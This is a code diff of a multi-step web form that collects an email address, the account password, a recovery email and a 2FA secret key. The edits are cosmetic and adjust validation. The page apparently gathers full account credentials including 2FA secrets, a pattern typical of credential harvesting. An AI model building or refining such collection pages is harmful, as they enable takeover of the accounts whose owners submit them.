@@ -54,11 +54,11 @@
     .back-btn {
       background: transparent;
       border: none;
-      width: 32px;
+      width: 36px;
       height: 32px;
       display: none;
       align-items: center;
-      justify-content: center;
+      justify-content: flex-start;
       cursor: pointer;
       color: var(--accent-blue);
       padding: 0;
@@ -132,25 +132,30 @@
       -webkit-user-select: text;
     }
 
+    /* Default Focus: Blue Glow */
     .ios-box:focus {
       border-color: var(--accent-blue);
-      box-shadow: 0 0 10px rgba(0, 122, 255, 0.15);
+      box-shadow: 0 0 10px rgba(0, 122, 255, 0.25), 0 2px 6px rgba(0, 122, 255, 0.1);
     }
 
+    /* Valid State: Green Glow */
     .ios-box.valid {
       border-color: var(--accent-green) !important;
+      box-shadow: 0 0 10px rgba(52, 199, 89, 0.25), 0 2px 6px rgba(52, 199, 89, 0.1) !important;
     }
 
+    /* Invalid State: Red Glow */
     .ios-box.invalid {
       border-color: var(--accent-red) !important;
+      box-shadow: 0 0 10px rgba(255, 59, 48, 0.25), 0 2px 6px rgba(255, 59, 48, 0.1) !important;
     }
 
-    /* Right Side Indicator: Green Background with Smaller White Checkmark */
+    /* Right Side Indicator: Small Green Background with White Checkmark */
     .input-indicator {
       position: absolute;
       right: 12px;
-      width: 20px;
-      height: 20px;
+      width: 18px;
+      height: 18px;
       background: var(--accent-green);
       border-radius: 50%;
       display: none;
@@ -179,7 +184,7 @@
       display: flex;
     }
 
-    /* Action Container & Compact Proceed Button (Full width, low height) */
+    /* Action Container & Compact Proceed Button (Full width, lower height) */
     .action-container {
       width: 100%;
       max-width: 420px;
@@ -368,10 +373,13 @@
 </head>
 <body>
 
-  <!-- Top Navigation Header with iOS Back Arrow -->
+  <!-- Top Navigation Header with iOS Back Arrow (Long line with arrow head) -->
   <div class="top-nav">
     <button class="back-btn" id="back-btn-elem" onclick="goBackStep()">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+      <svg width="24" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="19" y1="12" x2="5" y2="12"></line>
+        <polyline points="12 19 5 12 12 5"></polyline>
+      </svg>
     </button>
     <h1 class="header-title" id="main-title">Your Email Address</h1>
   </div>
@@ -383,7 +391,7 @@
       <div class="input-wrapper">
         <input type="email" id="input-email" class="ios-box" placeholder="Enter email address" oninput="validateEmailField()">
         <div class="input-indicator" id="email-indicator">
-          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
         </div>
       </div>
       <div class="field-error-msg" id="email-error-msg">
@@ -408,14 +416,14 @@
     </div>
   </div>
 
-  <!-- Step 2: Password -->
+  <!-- Step 2: Password (Min 8 chars) -->
   <div id="step-2" class="step-container">
     <div class="info-box-group">
       <label class="box-label">Your Account Password</label>
       <div class="input-wrapper">
-        <input type="password" id="input-password" class="ios-box" placeholder="Enter account password" oninput="validateStandardField('password', 6, 2)">
+        <input type="password" id="input-password" class="ios-box" placeholder="Enter account password" oninput="validateStandardField('password', 8, 2)">
         <div class="input-indicator" id="password-indicator">
-          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
         </div>
       </div>
     </div>
@@ -443,7 +451,7 @@
       <div class="input-wrapper">
         <input type="email" id="input-recovery" class="ios-box" placeholder="Enter recovery email" oninput="validateStandardField('recovery', 3, 3)">
         <div class="input-indicator" id="recovery-indicator">
-          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
         </div>
       </div>
     </div>
@@ -467,17 +475,17 @@
   <!-- Step 4: 2FA Secret Key -->
   <div id="step-4" class="step-container">
     <div class="info-box-group">
-      <label class="box-label">Your Secret Key</label>
+      <label class="box-label">Your 2FA Secret Key</label>
       <div class="input-wrapper">
-        <input type="text" id="input-2fa" class="ios-box" placeholder="Enter secret key" oninput="validateStandardField('2fa', 8, 4)">
+        <input type="text" id="input-2fa" class="ios-box" placeholder="Enter 2FA Secret Key" oninput="validateStandardField('2fa', 8, 4)">
         <div class="input-indicator" id="2fa-indicator">
-          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          <svg width="9" height="9" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
         </div>
       </div>
     </div>
     <div class="action-container">
       <button class="btn-proceed" id="btn-4" disabled onclick="nextStep(4)">
-        <span id="btn-text-4">Review Details</span>
+        <span id="btn-text-4">Proceed</span>
         <svg class="ios-spinner" id="spinner-4" viewBox="0 0 24 24">
           <line x1="12" y1="3" x2="12" y2="6" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" opacity="1"/>
           <line x1="18.36" y1="5.64" x2="16.24" y2="7.76" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" opacity="0.875"/>
@@ -503,7 +511,7 @@
     const copyIconSVG = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>`;
     const checkIconSVG = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
 
-    // URL থেকে ডাটা গেট করে existingSavedEmails এ সেট করা (আপনার দেওয়া লজিক অনুযায়ী)
+    // URL থেকে ডাটা গেট করা
     let existingSavedEmails = [];
     try {
       const urlParams = new URLSearchParams(window.location.search);
@@ -522,7 +530,7 @@
       1: "Your Email Address",
       2: "Your Account Password",
       3: "Your Recovery Email",
-      4: "Your Secret Key",
+      4: "Your 2FA Secret Key",
       5: "Confirm Account Details"
     };
 
@@ -533,7 +541,7 @@
     function updateNavHeader() {
       document.getElementById('main-title').innerText = stepTitles[currentStep];
       const backBtn = document.getElementById('back-btn-elem');
-      if (currentStep > 1 && currentStep < 5) {
+      if (currentStep > 1 && currentStep <= 5) {
         backBtn.classList.add('show');
       } else {
         backBtn.classList.remove('show');
@@ -552,7 +560,7 @@
       });
     }
 
-    // Step 1 Email Validation with existing database check & exclamation error
+    // Step 1 Email Validation
     function validateEmailField() {
       const input = document.getElementById('input-email');
       const indicator = document.getElementById('email-indicator');
@@ -575,14 +583,19 @@
           btn.disabled = false;
         }
       } else {
-        input.classList.remove('valid', 'invalid');
+        if (val.length > 0) {
+          input.classList.remove('valid');
+          input.classList.add('invalid');
+        } else {
+          input.classList.remove('valid', 'invalid');
+        }
         indicator.classList.remove('show');
         errorMsg.classList.remove('show');
         btn.disabled = true;
       }
     }
 
-    // Standard Validation for other fields
+    // Standard Validation (Password requires min 8 chars)
     function validateStandardField(fieldName, minLength, stepNum) {
       const input = document.getElementById(`input-${fieldName}`);
       const indicator = document.getElementById(`${fieldName}-indicator`);
@@ -595,7 +608,12 @@
         indicator.classList.add('show');
         btn.disabled = false;
       } else {
-        input.classList.remove('valid', 'invalid');
+        if (val.length > 0) {
+          input.classList.remove('valid');
+          input.classList.add('invalid');
+        } else {
+          input.classList.remove('valid', 'invalid');
+        }
         indicator.classList.remove('show');
         btn.disabled = true;
       }
@@ -614,24 +632,26 @@
       const spinner = document.getElementById(`spinner-${step}`);
       const btn = document.getElementById(`btn-${step}`);
 
-      btnText.style.display = 'none';
-      spinner.style.display = 'inline-block';
-      btn.disabled = true;
+      if (step < 4) {
+        btnText.style.display = 'none';
+        spinner.style.display = 'inline-block';
+        btn.disabled = true;
 
-      setTimeout(() => {
-        spinner.style.display = 'none';
-        btnText.style.display = 'inline';
-        btn.disabled = false;
+        setTimeout(() => {
+          spinner.style.display = 'none';
+          btnText.style.display = 'inline';
+          btn.disabled = false;
 
-        document.getElementById(`step-${step}`).classList.remove('active');
-        currentStep = step + 1;
-        document.getElementById(`step-${currentStep}`).classList.add('active');
-        updateNavHeader();
-      }, 300);
+          document.getElementById(`step-${step}`).classList.remove('active');
+          currentStep = step + 1;
+          document.getElementById(`step-${currentStep}`).classList.add('active');
+          updateNavHeader();
+        }, 300);
+      }
     }
 
     function goBackStep() {
-      if (currentStep > 1 && currentStep < 5) {
+      if (currentStep > 1 && currentStep <= 5) {
         document.getElementById(`step-${currentStep}`).classList.remove('active');
         currentStep--;
         document.getElementById(`step-${currentStep}`).classList.add('active');
@@ -768,7 +788,7 @@
 
         <div class="card-actions">
           <button class="action-btn-confirm" onclick="submitFinalData()">
-            ${checkIconSVG} Confirm & Submit Details
+            ${checkIconSVG} Account Saved
           </button>
         </div>
       `;
